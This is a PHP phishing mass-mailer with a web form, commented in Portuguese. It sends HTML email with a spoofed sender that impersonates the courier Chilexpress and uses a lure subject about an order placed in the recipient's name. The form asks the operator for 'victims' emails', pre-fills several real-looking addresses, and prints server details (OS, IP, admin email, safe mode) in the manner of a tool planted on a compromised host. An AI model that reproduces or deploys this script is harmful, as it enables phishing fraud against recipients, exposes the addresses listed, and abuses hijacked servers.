<?php
@ignore_user_abort(TRUE);
error_reporting(0);
@set_time_limit(0);
$testa = $_POST['veio'];
if($testa != "") {
	
	$nome = $_POST['nome'];

	$to = $_POST['emails'];

	/*$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";	
    */
    //CABE?ALHO DO EMAIL
	
   /* $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
    $headers .= "Content-Transfer-encoding: 8bit\r\n";
    $headers .= "Message-ID: <".md5(uniqid(time()))."@".$dominio.">\r\n";
    $headers .= "X-Priority: 3\r\n";
    $headers .= "X-MSmail-Priority: High\r\n";
	$headers .= "X-Mailer: PHPMailer [version 1.73]\r\n";   */
		$email = explode("\n", $to);
	
	function random_num(){
        for($x = 0; $x < 4; $x++){
        $n = $n . rand(1,9);
        }
         return mt_rand(1,2) . $n;
        }

        $de = $_POST['de'];
        $de = str_replace("%random_num%", random_num(), $de);

$headers .= "From: ".$nome." <".$de.">\r\n";
//$headers="From: <nao-responda>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-type: text/html; charset=iso-8859-1\r\n";
$headers.="X-Mailer: PHP/".phpversion()."\r\n";

	$i = 0;
	$j = 0;
	$count = 1;
        ?>
        <?php
	while($email[$i]) {
        $message = $_POST['html'];
        $subject = $_POST['assunto'];
	$message = str_replace("%EMAIL%", $email[$i], $message);
	$message = str_replace("%random_num%", random_num(), $message);
	$message = str_replace("", $hot, $message);
	$subject = str_replace("%random_num%", random_num(), $subject);
	$subject = str_replace("%EMAIL%", $email[$i], $subject);
        $subject = str_replace("", $hot, $subject);
		$ok = "ok";
        $message = stripslashes($message);
		if(mail($email[$i], $subject, $message, $headers))
		echo "* Numero: $count <b>".$email[$i]."</b> <font color=green>OK</font><br><hr>";
		else
		echo "* Numero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR</font><br><hr>";
		$i++;
		$count++;
		$j++;
               // if($j == '1000'){ //Quantidade de Emails que voce deseja que a funcao sleep atrase o script
               //     sleep(60);  //Atrasa o script em segundos! Ex.: 240 equivale a 4 minutos!
               //     $j = '0';    //Zera a variavel j.
               // }
	}
	$count--;
	if($ok == "ok")
	echo "";
}

?>
<html>

<head>
<title>.::.</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top: 0;
	margin-bottom: 0;
}
.titulo {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 18px;
	color: #000000;
	font-weight: bold;
}

.normal {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #000000;
}

.form {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #333333;
	background-color: #FFFFFF;
	border: 1px dashed #666666;
}

.texto {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
}

.alerta {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	color: #990000;
	font-size: 10px;
}
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="464" height="511" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="462" height="25" align="center" bgcolor="#99CCFF">&nbsp;</td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#FFFFFF">
	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
		  <tr>
            <td align="right" height="17"><span class="texto">De / e-mail :</span></td>
            <td width="65%" height="17"><input name="nome" type="text" class="form" id="nome"  value="Chilexpress" style="width:48%" > <input name="de" type="text" class="form" id="de" value="chilexpress%random_num%" style="width:49%" ></td>
          </tr>
          <tr>
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" type="text" class="form" id="assunto" value="Respuesta: %EMAIL%, Tenemos un pedido en su nombre.. - %random_num%" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#99CCFF"><span class="texto">C&oacute;digo HTML:</span></td>

</div></div>
<br /><br />
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
              <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">

</textarea>
              <span class="alerta">*Lembrete: texto em HTML</span></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="47" colspan="2"><span class="texto">Coloque o email de suas vitimas abaixo: </span>
              <p><span class="texto">OBS: um e-mail em cima do outro </span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
<textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">marlonfmansk@bol.com.br
notificaciones-citi@outlook.com
alex.info786@gmail.com</textarea>
              <span class="alerta">*Separado por quebra de linha</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="Submit" name="Submit" value="Enviar"></td>
          </tr>
        </table>
	  </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#99CCFF">&nbsp;</td>
    </tr>
  </table>

</form>
Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>
Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
Endere&#231;o IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
Software usado: <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>
</body>